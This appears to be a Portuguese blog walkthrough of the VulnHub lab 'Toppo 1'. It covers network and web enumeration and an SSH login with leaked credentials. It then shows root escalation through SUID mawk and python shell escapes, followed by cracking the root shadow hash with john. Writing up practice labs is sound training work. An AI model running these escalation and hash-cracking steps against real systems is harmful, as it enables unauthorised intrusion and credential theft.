---
title: "VulnHub - Toppo 1"
tags: [Linux, Easy, Linpeas, Gobuster, Mawk, John, Python SUID]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/inicial.png)

Link: [Toppo1](https://www.vulnhub.com/entry/nullbyte-1,126/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/nmap2.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas aberta no servidor

> Porta 80 -> Web

> Portas 111 e 47709 -> RPC

> Porta 22 -> SSH

## Enumeração da Porta 80

Entramos pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/web.png)

Rodamos o Gobuster

```bash
gobuster dir -u http://192.168.56.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/gobuster.png)

### /mail

Verificamos o que temos no /mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/mail.png)

Pelo que parece devemos fazer um fuzzing de parâmetros pra ver se ele aceita algum

### /admin

Uma senha?!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/admin.png)

Sim, uma senha... e pelo que parece é do usuário **ted**, então vamos tentar ssh nela

# Ted --> Root

Sim! Deu certo

**ted:12345ted123**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/ssh.png)

## Linpeas

Rodamos o linpeas para procurar por pontos de escalação

[Linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/lin.png)

Baixamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/lin1.png)

Rodamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/lin2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/lin3.png)

## Suid MAWK

Verificamos que temos suid no binário mawk

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/mawk.png)

Verificamos como explorar isso

[GTFobins](https://gtfobins.github.io/gtfobins/mawk/#limited-suid)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/gt.png)

```bash
./mawk 'BEGIN {system("/bin/sh")}'
```

Exploramos e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/gt1.png)

Pegamos a flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/flag.png)

# Algo a Mais

Também podemos explorar essa máquina com o SUID Bit do python2.7

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/py.png)

Para achar manualmente o suid o comando é esse

```bash
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/p1.png)

Para explorar ele...

```bash
python2.7 -c "import pty; pty.spawn('/bin/sh');"
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/p2.png)

## Quebrando senha do root

Que tal tentarmos quebrar o hash da senha do root do shadow?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/shadow.png)

shadow
```
root:$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:17636:0:99999:7:::
```

passwd
```
root:x:0:0:root:/root:/bin/bash
```

Colocamos ele em um formato que o john entenda

```bash
unshadow passwd shadow > crack
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/unsh.png)

Agora é deixar ele trabalhar

```bash
john --wordlist /usr/share/john/password.lst crack --format=sha512crypt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/unsh1.png)

A senha é **test123**

Logamos via ssh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-toppo1/unsh2.png)